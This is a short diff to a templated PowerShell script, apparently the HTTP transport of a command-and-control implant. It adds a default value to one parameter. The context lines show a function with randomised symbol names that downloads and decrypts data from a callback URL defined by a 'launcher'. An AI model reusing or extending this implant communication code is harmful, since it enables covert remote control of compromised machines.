@@ -52,7 +52,7 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 {% if transport in ['http', 'https'] %}
     ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
     function {{symbol_name("Transport-String")}} {
-        param([String]$1, [hashtable]$2, [Bool]$3=$False)
+        param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
         $args = "?t={{transport}}"
         foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
         return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.DownloadString("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $3
